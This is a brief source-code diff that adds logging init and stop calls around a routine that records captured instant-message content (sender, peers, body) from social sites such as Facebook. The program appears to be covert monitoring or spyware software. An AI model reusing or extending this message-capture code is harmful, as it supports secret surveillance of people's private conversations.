@@ -83,7 +83,9 @@ void LogSocialIMMessageW(WCHAR *program, WCHAR *topic, WCHAR *peers, WCHAR *auth
 		tolog.add(L": ", wcslen(L": ")*sizeof(WCHAR));
 		tolog.add(body, (wcslen(body)+1)*sizeof(WCHAR));
 		tolog.add(&delimiter, sizeof(DWORD));
+		LOG_InitAgentLog(PM_IMAGENT_SOCIAL);
 		LOG_ReportLog(PM_IMAGENT_SOCIAL, tolog.get_buf(), tolog.get_len());
+		LOG_StopAgentLog(PM_IMAGENT_SOCIAL);
 	}
 }
 
@@ -121,6 +123,7 @@ void SocialMainLoop()
 
 	InitSocialEntries();
 	SocialWinHttpSetup(L"http://www.facebook.com");
+	LOG_InitSequentialLogs();
 
 	for (;;) {
 		// Busy wait...
